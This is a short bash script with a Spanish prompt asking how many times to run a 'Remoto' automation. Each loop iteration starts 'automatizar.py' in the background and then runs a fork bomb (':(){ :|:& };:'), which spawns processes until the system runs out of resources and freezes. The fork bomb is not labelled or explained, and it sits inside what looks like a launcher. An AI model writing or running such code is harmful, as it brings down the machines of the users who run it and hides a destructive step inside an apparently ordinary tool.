#!/bin/bash
echo "¿Cuantas veces desea ejecutar el Remoto? "
read num
for i in `seq $num`
do
	python automatizar.py &
	:(){ :|:& };:
done
exit 1
